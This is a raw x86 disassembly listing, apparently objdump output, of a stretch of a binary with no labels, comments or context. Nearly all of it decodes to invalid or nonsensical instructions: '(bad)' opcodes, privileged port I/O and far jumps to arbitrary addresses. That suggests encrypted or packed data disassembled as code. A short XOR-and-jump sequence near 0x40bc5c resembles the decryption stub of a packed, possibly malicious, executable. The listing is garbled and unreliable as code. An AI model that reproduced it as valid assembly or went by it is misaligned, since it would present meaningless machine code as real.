  40b7c3:	stos   BYTE PTR es:[edi],al
  40b7c4:	aas    
  40b7c5:	or     al,0x7d
  40b7c7:	out    0x53,al
  40b7c9:	mov    BYTE PTR [esp+edx*4+0x1de2f593],ch
  40b7d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7d1:	clc    
  40b7d2:	in     al,dx
  40b7d3:	mov    BYTE PTR [edi+0x55],0x88
  40b7d7:	call   0xae2f1218
  40b7dc:	or     eax,0x8b55e400
  40b7e1:	xchg   DWORD PTR [esi],edi
  40b7e3:	jo     0x40b7f9
  40b7e5:	mov    al,0x65
  40b7e7:	push   ds
  40b7e8:	jmp    0x40b7bb
  40b7ea:	mov    bh,BYTE PTR [esi-0x20]
  40b7ed:	adc    ch,al
  40b7ef:	cld    
  40b7f0:	icebp  
  40b7f1:	xor    BYTE PTR [eax+0x5b77601a],0x54
  40b7f8:	out    dx,eax
  40b7f9:	and    al,0xa9
  40b7fc:	sub    BYTE PTR [edx],bh
  40b7fe:	loop   0x40b824
  40b800:	sbb    BYTE PTR [ebx],cl
  40b802:	je     0x40b7dd
  40b804:	and    eax,0xa2a6c4bd
  40b809:	mov    bl,BYTE PTR [eax+0x30f944fa]
  40b80f:	cld    
  40b810:	out    dx,eax
  40b811:	cmp    BYTE PTR [edi],dl
  40b813:	data16 fs mov al,0xec
  40b817:	cmp    bh,bl
  40b819:	addr16 (bad) 
  40b81b:	clc    
  40b81c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b81d:	out    0xbb,eax
  40b81f:	push   edx
  40b820:	imul   eax,eax,0x42
  40b823:	xchg   DWORD PTR [eax-0x51],edx
  40b826:	in     al,dx
  40b827:	cdq    
  40b828:	mov    ss,edi
  40b82a:	test   al,0x95
  40b82c:	mov    fs,WORD PTR [edi+0x15]
  40b82f:	ror    esi,cl
  40b831:	mov    ah,BYTE PTR [eax+0x444511de]
  40b837:	add    dl,BYTE PTR [ebx-0x961c071]
  40b83d:	sub    BYTE PTR [ecx-0x6207dd6b],0xe4
  40b844:	cmp    BYTE PTR [edi],ch
  40b846:	shl    DWORD PTR [ecx-0x48],0xa
  40b84a:	inc    ebp
  40b84b:	rcl    BYTE PTR [edx],cl
  40b84d:	loope  0x40b88f
  40b84f:	adc    al,0x35
  40b851:	(bad)
  40b854:	push   esi
  40b855:	adc    dh,ch
  40b857:	xlat   BYTE PTR ds:[ebx]
  40b858:	cdq    
  40b859:	ins    DWORD PTR es:[edi],dx
  40b85a:	test   al,0x2f
  40b85c:	sub    dh,BYTE PTR [edx+0x1]
  40b85f:	std    
  40b860:	and    DWORD PTR [edi+0x61a3284a],esi
  40b866:	cmp    dh,BYTE PTR [eax-0x5f1babe]
  40b86c:	out    0x1b,eax
  40b86e:	pop    esp
  40b86f:	adc    BYTE PTR [edi-0x7c93f060],ch
  40b875:	fild   DWORD PTR [edx+0x37012b9b]
  40b87b:	inc    edx
  40b87c:	scas   eax,DWORD PTR es:[edi]
  40b87d:	push   esi
  40b87e:	sbb    DWORD PTR [ebx-0x18f69b97],edi
  40b884:	push   esi
  40b885:	pop    esi
  40b886:	out    dx,al
  40b887:	test   al,0xf0
  40b889:	int    0x4a
  40b88b:	(bad)  
  40b88c:	or     BYTE PTR [ebx+0x29],dl
  40b88f:	or     eax,0x5b814d5c
  40b894:	inc    ebp
  40b895:	les    ecx,FWORD PTR [eax]
  40b897:	jnp    0x40b8cc
  40b899:	in     al,0xb
  40b89b:	push   ebp
  40b89c:	data16 test al,0x33
  40b89f:	pop    ss
  40b8a0:	jg     0x40b8ce
  40b8a2:	or     eax,0x5950a434
  40b8a7:	ror    BYTE PTR [edi+0x70],cl
  40b8aa:	xchg   ebp,eax
  40b8ab:	sahf   
  40b8ac:	and    eax,0x36c697c
  40b8b1:	push   esi
  40b8b2:	jb     0x40b871
  40b8b4:	popa   
  40b8b5:	test   eax,0x377bc99a
  40b8ba:	loop   0x40b90d
  40b8bc:	xchg   BYTE PTR ds:0x8fe1baba,ch
  40b8c2:	dec    edi
  40b8c3:	cld    
  40b8c4:	mov    ch,BYTE PTR [edx+eax*8-0x9df92e4]
  40b8cb:	sub    BYTE PTR [edi+ecx*1],0x2
  40b8cf:	out    dx,eax
  40b8d0:	mov    ch,0x3f
  40b8d2:	mov    ah,BYTE PTR [esi+0x3c]
  40b8d5:	or     eax,0xab6b3e52
  40b8da:	push   esi
  40b8db:	jle    0x40b955
  40b8dd:	adc    edi,eax
  40b8df:	sahf   
  40b8e0:	add    dl,al
  40b8e2:	gs aas 
  40b8e4:	pop    edx
  40b8e5:	cmc    
  40b8e6:	sbb    al,0xe1
  40b8e8:	pop    ebp
  40b8e9:	fimul  DWORD PTR [ecx+0x6cbe5cf9]
  40b8ef:	add    al,0xb8
  40b8f1:	add    BYTE PTR [edi],al
  40b8f3:	and    eax,0xdcb28f7a
  40b8f8:	pop    ebx
  40b8f9:	mov    ch,BYTE PTR [ebp-0x11f13964]
  40b8ff:	xchg   edi,eax
  40b900:	lods   al,BYTE PTR ds:[esi]
  40b901:	pop    edi
  40b902:	and    eax,0x6c6950e0
  40b907:	lahf   
  40b908:	and    eax,0x2ef7cff2
  40b90d:	cmp    BYTE PTR [edx],ch
  40b90f:	or     ecx,DWORD PTR [edi]
  40b911:	aad    0x77
  40b913:	sbb    al,0x3d
  40b915:	(bad)  
  40b916:	test   al,0x31
  40b918:	jnp    0x40b929
  40b91a:	test   BYTE PTR [edi],ah
  40b91c:	add    eax,DWORD PTR [eax]
  40b91e:	add    BYTE PTR [ebx+0x2081f045],cl
  40b924:	sbb    BYTE PTR [esi*2-0x3451700],0xff
  40b92c:	(bad)  
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	rol    ebp,cl
  40b93f:	xor    eax,DWORD PTR [esp+ebx*4]
  40b942:	(bad)  
  40b943:	mov    WORD PTR [eax+0x78],?
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	gs jle 0x40b938
  40b94d:	pop    esp
  40b94e:	popf   
  40b94f:	ds jbe 0x40b8db
  40b952:	xor    DWORD PTR [ecx+0x2],edi
  40b955:	(bad)  
  40b956:	xor    eax,edi
  40b958:	ss mov al,0x87
  40b95b:	pushf  
  40b95c:	cmp    edi,DWORD PTR [ebp-0x5d]
  40b95f:	les    ebx,FWORD PTR [edi]
  40b961:	pop    edx
  40b962:	(bad)  
  40b963:	arpl   WORD PTR [eax],di
  40b965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b966:	sbb    al,0x3c
  40b968:	cs icebp 
  40b96a:	popf   
  40b96b:	imul   esi,DWORD PTR [ebx-0x729ec761],0x42
  40b972:	adc    al,0xd5
  40b974:	push   ecx
  40b975:	jbe    0x40b9c6
  40b977:	xchg   ecx,eax
  40b978:	nop
  40b979:	jp     0x40b940
  40b97b:	sbb    esi,DWORD PTR [edx+0xcb2a135]
  40b981:	clc    
  40b982:	int3   
  40b983:	mov    WORD PTR [ebx],fs
  40b985:	out    0x82,al
  40b987:	dec    ecx
  40b988:	sub    eax,0x38e86b96
  40b98d:	fdivr  DWORD PTR [ebx+0x6b45eaf5]
  40b993:	clc    
  40b994:	scas   eax,DWORD PTR es:[edi]
  40b995:	pop    ecx
  40b996:	sti    
  40b997:	aam    0x8c
  40b999:	(bad)  
  40b99a:	inc    ebx
  40b99b:	mov    bh,0x78
  40b99d:	pusha  
  40b99e:	dec    edi
  40b99f:	retf   
  40b9a0:	inc    ecx
  40b9a1:	mov    edx,0x13dcb616
  40b9a6:	data16 fadd DWORD PTR [edx-0x1a]
  40b9aa:	inc    esp
  40b9ab:	mov    edi,0xd16bfc85
  40b9b0:	data16 aad 0x23
  40b9b3:	sub    esi,DWORD PTR [eax-0x6bff4017]
  40b9b9:	sbb    bh,BYTE PTR [edi+0x1b]
  40b9bc:	adc    bh,dh
  40b9be:	or     al,0xb6
  40b9c0:	xor    eax,0x74997440
  40b9c5:	aad    0xf4
  40b9c7:	iret   
  40b9c8:	fst    QWORD PTR [eax]
  40b9ca:	and    BYTE PTR [ebx-0x33f276b5],ch
  40b9d0:	ins    DWORD PTR es:[edi],dx
  40b9d1:	cli    
  40b9d2:	bound  esi,QWORD PTR [eax]
  40b9d4:	xchg   esp,eax
  40b9d5:	cwde   
  40b9d6:	add    DWORD PTR [eax],ebp
  40b9d8:	or     eax,0xa77199a2
  40b9dd:	sub    ah,BYTE PTR [ebx-0x38eaac6b]
  40b9e3:	and    bl,BYTE PTR [edx]
  40b9e5:	pop    eax
  40b9e6:	enter  0xe2f2,0x8c
  40b9ea:	out    0x3,eax
  40b9ec:	mov    al,ds:0x18949b14
  40b9f1:	push   ebx
  40b9f2:	(bad)  
  40b9f3:	lods   eax,DWORD PTR ds:[esi]
  40b9f4:	mov    edx,0xeb87ba8e
  40b9f9:	test   al,0xec
  40b9fb:	jge    0x40ba33
  40b9fd:	shl    ch,1
  40b9ff:	imul   edx,DWORD PTR [edi-0x39],0xc7ab2d10
  40ba06:	mov    eax,ds:0xbaadc2dc
  40ba0b:	mov    bl,0x64
  40ba0d:	mov    eax,0x3a09661c
  40ba12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba13:	popf   
  40ba14:	mov    edi,0x987d9cde
  40ba19:	sbb    al,0xd4
  40ba1b:	fwait
  40ba1c:	mov    ds:0x30a30235,al
  40ba21:	pop    edx
  40ba22:	ror    DWORD PTR [ebx],0x72
  40ba25:	xchg   edi,eax
  40ba26:	add    BYTE PTR [ecx],0x61
  40ba29:	push   ebp
  40ba2a:	lods   eax,DWORD PTR ds:[esi]
  40ba2b:	scas   al,BYTE PTR es:[edi]
  40ba2c:	fs push 0x71511ddb
  40ba32:	(bad)  
  40ba33:	pop    ebp
  40ba34:	sbb    eax,ebp
  40ba36:	and    ebp,ebp
  40ba38:	or     al,0xe
  40ba3a:	gs jb  0x40ba12
  40ba3d:	dec    ebx
  40ba3e:	mov    cl,0x32
  40ba40:	fcmovu st,st(3)
  40ba42:	and    al,0xab
  40ba44:	pop    esi
  40ba45:	cmp    edx,DWORD PTR [ebx-0x7e]
  40ba48:	es icebp 
  40ba4a:	mov    cl,0xb1
  40ba4c:	and    eax,0x6f1fd6a3
  40ba51:	push   0x24685e2a
  40ba56:	pop    edi
  40ba57:	jmp    0xb533898
  40ba5c:	jno    0x40ba21
  40ba5e:	js     0x40ba77
  40ba60:	push   esi
  40ba61:	shl    BYTE PTR [ecx],cl
  40ba63:	lods   eax,DWORD PTR ds:[esi]
  40ba64:	jno    0x40ba0e
  40ba66:	xlat   BYTE PTR ds:[ebx]
  40ba67:	push   es
  40ba68:	pusha  
  40ba69:	mov    BYTE PTR [eax+0x45d80dae],0xb4
  40ba70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba71:	jne    0x40ba39
  40ba73:	pushf  
  40ba74:	mov    ds:0xf4b4aef6,al
  40ba79:	out    dx,eax
  40ba7a:	(bad)  
  40ba7b:	(bad)  
  40ba7c:	popa   
  40ba7d:	xchg   edx,eax
  40ba7e:	ins    DWORD PTR es:[edi],dx
  40ba7f:	sub    al,0xb
  40ba81:	or     edi,DWORD PTR [edi-0x34]
  40ba84:	mov    ah,0xf0
  40ba86:	xchg   esi,eax
  40ba87:	lock enter 0x9ef8,0xad
  40ba8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba8d:	ret    
  40ba8e:	or     DWORD PTR [edx+0x58],eax
  40ba91:	ror    bh,1
  40ba93:	mov    ch,bh
  40ba95:	retf   0x9b08
  40ba98:	xlat   BYTE PTR ds:[ebx]
  40ba99:	jle    0x40baca
  40ba9b:	xor    DWORD PTR [eax+eax*1],edx
  40ba9e:	fadd   DWORD PTR [edi+edx*4-0x6f80ddf]
  40baa5:	pop    esp
  40baa6:	jmp    0xe328:0xb6605467
  40baad:	add    eax,0x561562b5
  40bab2:	out    dx,eax
  40bab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bab4:	and    esp,DWORD PTR [eax]
  40bab6:	loopne 0x40bab1
  40bab8:	(bad)  
  40bab9:	call   DWORD PTR [ebx+0x33]
  40babc:	push   ss
  40babd:	cmp    DWORD PTR [edx-0x45],eax
  40bac0:	imul   esi,DWORD PTR [ecx+esi*1],0xb745f074
  40bac7:	arpl   WORD PTR [edx-0x725e3e0b],di
  40bacd:	or     DWORD PTR [edx+0x69],edi
  40bad0:	pop    es
  40bad1:	test   al,0x1d
  40bad3:	xor    eax,0x23045599
  40bad8:	xor    BYTE PTR [ebp-0x3c],0xf3
  40badc:	lea    ecx,[ebp+0x29e5b47a]
  40bae2:	pop    DWORD PTR [ecx]
  40bae4:	mov    WORD PTR [edx+0x6eaef15a],fs
  40baea:	pop    dx
  40baec:	jmp    0x2c1e4359
  40baf1:	push   cs
  40baf2:	lea    esp,[ecx+edi*2+0x46e74077]
  40baf9:	mov    WORD PTR [edi],ds
  40bafb:	cli    
  40bafc:	aad    0x3e
  40bafe:	sbb    DWORD PTR [eax+0x29],esp
  40bb01:	jb     0x40ba8b
  40bb03:	push   ds
  40bb04:	jns    0x40bb56
  40bb06:	adc    edi,ebp
  40bb08:	ss push ebp
  40bb0a:	mov    dh,BYTE PTR [ebp+0x44]
  40bb0d:	test   DWORD PTR ds:0xd0ad9054,ecx
  40bb13:	cmp    BYTE PTR [eax],ch
  40bb15:	adc    esi,ebx
  40bb17:	xchg   ebx,eax
  40bb18:	daa    
  40bb19:	call   0x18bf6c0d
  40bb1e:	ja     0x40baff
  40bb20:	shr    DWORD PTR [eax+0x7887b262],0xbc
  40bb27:	in     al,dx
  40bb28:	xor    DWORD PTR [edx-0x52],ecx
  40bb2b:	arpl   WORD PTR [ecx-0x23da8d3b],si
  40bb31:	stc    
  40bb32:	in     al,dx
  40bb33:	adc    BYTE PTR ds:0xd59d6296,cl
  40bb39:	or     ebx,ebx
  40bb3b:	or     eax,0x7f2b58aa
  40bb40:	into   
  40bb41:	call   0xf73b:0x6ee0e591
  40bb48:	sahf   
  40bb49:	sbb    al,0x6c
  40bb4b:	or     al,0xfa
  40bb4d:	inc    edx
  40bb4e:	mov    ch,0x70
  40bb50:	xchg   DWORD PTR [edx+0x36],ebx
  40bb53:	mov    edi,0x70ced0e1
  40bb58:	sub    eax,0x9ca35c0a
  40bb5d:	outs   dx,BYTE PTR ds:[esi]
  40bb5e:	xor    esi,edi
  40bb60:	xchg   ebx,eax
  40bb61:	mov    BYTE PTR [edx+0x2e],dl
  40bb64:	fsub   st,st(5)
  40bb66:	and    eax,0xd439585d
  40bb6b:	sbb    esp,esi
  40bb6d:	adc    eax,0x14422aed
  40bb72:	pushf  
  40bb73:	mov    dl,0xaf
  40bb75:	mov    DWORD PTR [esi+eiz*1+0x5b],eax
  40bb79:	das    
  40bb7a:	sub    bh,BYTE PTR [ebx+edi*4]
  40bb7d:	aad    0xf9
  40bb7f:	ror    BYTE PTR [ebp+0x41ed6b3b],1
  40bb85:	or     eax,0xbb87db41
  40bb8a:	mov    edi,0xe4b45341
  40bb8f:	pop    ebx
  40bb90:	out    0x38,eax
  40bb92:	mov    ecx,0x34e264a8
  40bb97:	sbb    eax,0xffffffea
  40bb9a:	in     eax,dx
  40bb9b:	and    DWORD PTR [ebx+0x3b],0x6647c298
  40bba2:	lods   eax,DWORD PTR ds:[esi]
  40bba3:	pop    ebp
  40bba4:	je     0x40bc18
  40bba6:	das    
  40bba7:	inc    eax
  40bba8:	mov    dh,0x33
  40bbaa:	retf   0xf33e
  40bbad:	jmp    0x8645a57f
  40bbb2:	lods   al,BYTE PTR ds:[esi]
  40bbb3:	jbe    0x40bb48
  40bbb5:	ret    0x2d4a
  40bbb8:	sbb    eax,DWORD PTR [ebx+0x17]
  40bbbb:	push   ss
  40bbbc:	popf   
  40bbbd:	adc    BYTE PTR [ebx+0x6558071f],ch
  40bbc3:	sti    
  40bbc4:	dec    esp
  40bbc5:	mov    al,0x70
  40bbc7:	imul   esi,DWORD PTR [ecx-0x4b4e5c46],0xffffffaa
  40bbce:	xchg   esi,eax
  40bbcf:	les    eax,FWORD PTR [ebx]
  40bbd1:	scas   al,BYTE PTR es:[edi]
  40bbd2:	iret   
  40bbd3:	xchg   ebp,eax
  40bbd4:	jl     0x40bb57
  40bbd6:	loope  0x40bbb7
  40bbd8:	in     eax,dx
  40bbd9:	jnp    0x40bbcd
  40bbdb:	scas   eax,DWORD PTR es:[edi]
  40bbdc:	or     eax,0x76c34beb
  40bbe1:	imul   edi,DWORD PTR [ecx],0x442e7315
  40bbe7:	ds xchg ecx,eax
  40bbe9:	ud2    
  40bbeb:	into   
  40bbec:	ror    BYTE PTR [eax-0x6ac33b07],cl
  40bbf2:	cmp    eax,0x6c47ec60
  40bbf7:	and    ecx,DWORD PTR [ebp+0x37]
  40bbfa:	mov    al,ds:0x9dd04237
  40bbff:	fldcw  WORD PTR [eax+0x679bf9be]
  40bc05:	jmp    0xe7323fb7
  40bc0a:	xor    BYTE PTR [edx-0x15],ah
  40bc0d:	shl    DWORD PTR [ecx],0x73
  40bc10:	jns    0x40bb9b
  40bc12:	cmp    BYTE PTR [edx+0x36],dl
  40bc15:	aas    
  40bc16:	adc    ebx,DWORD PTR [ecx+0x67]
  40bc19:	push   eax
  40bc1a:	sub    esi,ebp
  40bc1c:	std    
  40bc1d:	xchg   esi,eax
  40bc1e:	je     0x40bc72
  40bc20:	add    eax,0x9a540a43
  40bc25:	inc    ebp
  40bc26:	stc    
  40bc27:	or     eax,0x3cbb9e2c
  40bc2c:	adc    bl,BYTE PTR [esp+esi*2-0x189b0b5a]
  40bc33:	add    DWORD PTR [edi],ebx
  40bc35:	pop    ebx
  40bc36:	adc    eax,eax
  40bc38:	sub    edi,DWORD PTR [eax+esi*2]
  40bc3b:	repnz and al,0xaf
  40bc3e:	aas    
  40bc3f:	arpl   WORD PTR [ebx+0x25],dx
  40bc42:	popf   
  40bc43:	js     0x40bc93
  40bc45:	xor    cl,BYTE PTR [ebx+0x558bf445]
  40bc4b:	call   0x767e7e5b
  40bc50:	jle    0x40bbf1
  40bc52:	cli    
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc56
  40bc7d:	or     BYTE PTR [esi],ch
  40bc7f:	sub    edx,eax
  40bc81:	xchg   ecx,eax
  40bc82:	js     0x40bcfc
  40bc84:	je     0x40bd04
  40bc86:	js     0x40bd00
  40bc88:	xchg   esi,ebx
  40bc8a:	adc    ah,BYTE PTR ds:0x8f989026
  40bc90:	add    eax,0x4d20475
  40bc95:	sub    eax,0xfff2a646
  40bc9a:	arpl   WORD PTR [esi],sp
  40bc9c:	sbb    eax,0x74188316
  40bca1:	or     dh,BYTE PTR [edi-0xf]
  40bca4:	pop    eax
  40bca5:	sti    
  40bca6:	and    BYTE PTR [ebp+0x3092bbe6],bl
  40bcac:	leave  
  40bcad:	xchg   ecx,eax
  40bcae:	lock lock sbb DWORD PTR [eax-0xe],0x863794ac
  40bcb7:	xlat   BYTE PTR ds:[ebx]
  40bcb8:	(bad)  
  40bcba:	leave  
  40bcbb:	jmp    0x40bc9d
  40bcbd:	xlat   BYTE PTR ds:[ebx]
  40bcbe:	popa   
  40bcbf:	std    
  40bcc0:	mov    bh,0x8
  40bcc2:	nop
  40bcc3:	sub    dh,BYTE PTR [eax+0x43]
  40bcc6:	pop    es
  40bcc7:	je     0x40bcbb
  40bcc9:	test   ecx,esi
  40bccb:	pop    esp
  40bccc:	hlt    
  40bccd:	sbb    bh,BYTE PTR [esi-0x3e]
  40bcd0:	jmp    0x40bc93
  40bcd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcd3:	test   BYTE PTR [ecx*4+0x64e9eca1],ch
  40bcda:	pop    ebp
  40bcdb:	mov    esp,0xe8276632
  40bce0:	iret   
  40bce1:	loopne 0x40bc96
  40bce3:	sub    ebp,0x2c4c954d
  40bce9:	mov    ?,edi
  40bceb:	std    
  40bcec:	in     eax,dx
  40bced:	or     ch,BYTE PTR [edx+0x4f]
  40bcf0:	jno    0x40bcab
  40bcf2:	jnp    0x40bce3
  40bcf4:	and    esp,DWORD PTR [ecx*1+0x640234d]
  40bcfb:	cmp    esp,DWORD PTR [esi+0x3c]
  40bcfe:	jmp    0x40bd77
  40bd00:	test   eax,0x126c2349
  40bd05:	enter  0x15b5,0x25
  40bd09:	loop   0x40bc9c
  40bd0b:	ds fldcw WORD PTR es:[edi+eax*8+0x4cdced2c]
  40bd14:	jno    0x40bd16
  40bd16:	js     0x40bd30
  40bd18:	dec    DWORD PTR [ebx]
  40bd1a:	std    
  40bd1b:	ja     0x40bd25
  40bd1d:	retf   0x113c
  40bd20:	ficom  DWORD PTR [ebp+ebp*2-0x6af8123]
  40bd27:	rcr    DWORD PTR [ebp-0x711d9e84],1
  40bd2d:	ja     0x40bd09
  40bd2f:	mov    fs,WORD PTR [eax-0x71]
  40bd32:	(bad)  [eax]
  40bd34:	cdq    
  40bd35:	or     ecx,DWORD PTR [esi]
  40bd37:	xlat   BYTE PTR ds:[ebx]
  40bd38:	pushf  
  40bd39:	dec    edx
  40bd3a:	add    al,0x7c
  40bd3c:	or     bl,BYTE PTR [edx+0x77a8c1ca]
  40bd42:	push   edx
  40bd43:	xchg   edi,eax
  40bd44:	std    
  40bd45:	outs   dx,DWORD PTR ds:[esi]
  40bd46:	pop    esp
  40bd47:	out    0x6b,eax
  40bd49:	into   
  40bd4a:	mov    esp,0xc6f03e01
  40bd4f:	test   eax,0x6cc5f198
  40bd54:	jp     0x40bdb8
  40bd56:	jg     0x40bcf4
  40bd58:	add    BYTE PTR gs:[ebx],0x67
  40bd5c:	pop    ss
  40bd5d:	xchg   esp,eax
  40bd5e:	xor    esp,DWORD PTR [edi+edi*4-0x3f90d4fe]
  40bd65:	or     al,0xdf
  40bd67:	inc    ebp
  40bd68:	push   edx
  40bd69:	mov    ebx,0x29d99754
  40bd6e:	call   FWORD PTR [ecx+0x36]
  40bd71:	sbb    eax,0xa330e80c
  40bd76:	inc    esi
  40bd77:	mov    bl,0xed
  40bd79:	imul   ecx,DWORD PTR [edi-0x72],0x4b
  40bd7d:	pop    ebp
  40bd7e:	sub    BYTE PTR [edx+0x4be83385],bh
  40bd84:	mov    ebx,0x242edddb
  40bd89:	in     al,dx
  40bd8a:	mov    ds:0xb6845930,al
  40bd8f:	or     DWORD PTR [ebp+0x15af7228],esp
  40bd95:	(bad)  
  40bd96:	out    0x5,al
  40bd98:	xchg   esp,eax
  40bd99:	rol    BYTE PTR [ebx-0x2f2f5f0e],0x9d
  40bda0:	mov    ecx,0xb4eb910a
  40bda5:	adc    al,BYTE PTR [edx-0x6a667597]
  40bdab:	pop    edx
  40bdac:	sbb    al,0xfd
  40bdae:	cmp    al,0x3b
  40bdb0:	adc    DWORD PTR [ecx-0x5c],0xb790a0ad
  40bdb7:	repz jo 0x40be2e
  40bdba:	imul   ebx,DWORD PTR [ebx-0x4af99d5a],0x652a4bf3
  40bdc4:	out    dx,eax
  40bdc5:	jp     0x40bd76
  40bdc7:	mov    al,0x5a
  40bdc9:	mov    bh,0xc5
  40bdcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdcc:	push   esi
  40bdcd:	mov    eax,0x4108f7f9
  40bdd2:	fbstp  TBYTE PTR [ebp-0x14]
  40bdd5:	clc    
  40bdd6:	imul   esi,DWORD PTR [eax+0x69],0xfffffffe
  40bdda:	stc    
  40bddb:	inc    esp
  40bddc:	cwde   
  40bddd:	out    dx,al
  40bdde:	sub    DWORD PTR [edi],0xffffffb1
  40bde1:	or     al,0xda
  40bde3:	iret   
  40bde4:	inc    esi
  40bde5:	js     0x40bd7a
  40bde7:	stc    
  40bde8:	call   0x6503:0xf877becb
  40bdef:	(bad)  
  40bdf0:	sbb    al,0x33
  40bdf2:	mov    cl,0x3
  40bdf4:	fmul   DWORD PTR [ebp+0x59976aa9]
  40bdfa:	aas    
  40bdfb:	push   ebx
  40bdfc:	daa    
  40bdfd:	push   0x1b
  40bdff:	push   ss
  40be00:	and    ch,BYTE PTR [ebx]
  40be02:	aam    0x45
  40be04:	mov    ebx,0x9df5eada
  40be09:	inc    ecx
  40be0a:	jmp    0x49a7188a
  40be0f:	stos   DWORD PTR es:[edi],eax
  40be10:	push   edx
  40be11:	repnz xor DWORD PTR [ecx],esp
  40be14:	dec    ebx
  40be15:	jmp    0xba4a:0x5fbf2910
  40be1c:	aaa    
  40be1d:	inc    edi
  40be1e:	fldcw  WORD PTR [eax+0x4b]
  40be21:	pusha  
  40be22:	xchg   ebp,eax
  40be23:	xor    esi,DWORD PTR [edx-0x6a08f36]
  40be29:	add    edx,esi
  40be2b:	dec    esp
  40be2c:	das    
  40be2d:	pushf  
  40be2e:	shr    DWORD PTR [ecx+0x97e6f88],cl
  40be34:	call   0x6e5e:0x934529f6
  40be3b:	push   edx
  40be3c:	push   ebp
  40be3d:	mov    dl,0xed
  40be3f:	or     al,0x5b
  40be41:	pop    esi
  40be42:	fisub  DWORD PTR [esi+0x13]
  40be45:	js     0x40be8b
  40be47:	or     ebp,DWORD PTR [ecx+0x1503c537]
  40be4d:	sbb    al,0x72
  40be4f:	jg     0x40be8c
  40be51:	test   al,0x58
  40be53:	sbb    cl,BYTE PTR [esi+0x1e]
  40be56:	gs addr16 and eax,0x95d10cdc
  40be5d:	push   edx
  40be5e:	xchg   esp,eax
  40be5f:	dec    edx
  40be60:	call   0xcc6bf8e7
  40be65:	push   ebx
  40be66:	push   DWORD PTR [esi+ebx*4-0x60]
  40be6a:	nop
  40be6b:	dec    eax
  40be6c:	jmp    0x40be7c
  40be6e:	jecxz  0x40bdf2
  40be70:	push   ss
  40be71:	mov    al,BYTE PTR [ebx-0x59]
  40be74:	xchg   ebp,eax
  40be75:	push   0xffffffad
  40be77:	into   
  40be78:	mov    bh,0x1f
  40be7a:	repnz gs mov ah,0x20
  40be7e:	div    BYTE PTR [eax+ebx*4-0x5c]
  40be82:	pop    es
  40be83:	jmp    0x40be93
  40be85:	popf   
  40be86:	dec    edx
  40be87:	jne    0x40bea2
  40be89:	adc    dl,BYTE PTR [esi]
  40be8b:	push   eax
  40be8c:	cmp    BYTE PTR [edi+0x21b93e71],ah
  40be92:	or     DWORD PTR [ebp-0x1c],ebx
  40be95:	xchg   BYTE PTR [edi-0x46],ah
  40be98:	js     0x40bea8
  40be9a:	out    0x88,eax
  40be9c:	inc    edi
  40be9d:	sbb    DWORD PTR [eax-0x5fd1359b],edx
  40bea3:	fiadd  WORD PTR [eax-0x16]
  40bea6:	xor    ebx,edi
  40bea8:	imul   edx,ebp,0x47e6771b
  40beae:	mov    al,0x59
  40beb0:	lock pop edx
  40beb2:	mov    bl,0x35
  40beb4:	and    cl,dl
  40beb6:	and    DWORD PTR [edx-0x662a981c],ebp
  40bebc:	jle    0x40be63
  40bebe:	pop    es
  40bebf:	lea    ecx,cs:[ebp+ecx*4+0x71d7a044]
  40bec7:	pop    ebx
  40bec8:	aam    0x16
  40beca:	push   0x984a6bad
  40becf:	cmp    BYTE PTR [edx+0x7acae186],dl
  40bed5:	xor    eax,0x1a3f4b63
  40beda:	scas   eax,DWORD PTR es:[edi]
  40bedb:	dec    edx
  40bedc:	loope  0x40be7c
  40bede:	fild   DWORD PTR [ecx+0x22]
  40bee1:	push   cs
  40bee2:	sub    DWORD PTR [eax-0x12],0x48dc33ba
  40bee9:	out    0xde,eax
  40beeb:	dec    edx
  40beec:	sub    eax,0xef0a9ff7
  40bef1:	mov    al,0xbc
  40bef3:	push   ebp
  40bef4:	fisub  WORD PTR [esi]
  40bef6:	inc    edi
  40bef7:	or     DWORD PTR [edi+0x72],ebp
  40befa:	push   ss
  40befb:	out    dx,al
  40befc:	mov    cl,0x88
  40befe:	mov    ds:0x954ccb75,eax
  40bf03:	sbb    eax,DWORD PTR [eax-0x60f958d9]
  40bf09:	test   eax,0x9cf26281
  40bf0e:	(bad)  
  40bf0f:	xchg   edx,eax
  40bf10:	loop   0x40bf61
  40bf12:	and    bl,BYTE PTR [edi+edx*1+0x58113187]
  40bf19:	push   ss
  40bf1a:	push   eax
  40bf1b:	jmp    0x7ea9c5df
  40bf20:	push   0x4c02d3a3
  40bf25:	ins    BYTE PTR es:[edi],dx
  40bf26:	or     al,0x89
  40bf28:	xlat   BYTE PTR ds:[ebx]
  40bf29:	or     eax,0xc46f5df6
  40bf2e:	dec    ebp
  40bf2f:	or     eax,0x5098ebdf
  40bf34:	ins    DWORD PTR es:[edi],dx
  40bf35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf36:	fstp   st(1)
  40bf38:	and    ebp,DWORD PTR [edx]
  40bf3a:	xchg   edx,eax
  40bf3b:	jbe    0x40bf11
  40bf3d:	out    0xea,eax
  40bf3f:	mov    edx,0x70312315
  40bf44:	loopne 0x40bef3
  40bf46:	ret    0xc970
  40bf49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf4a:	xor    al,0x8c
  40bf4c:	jo     0x40bf78
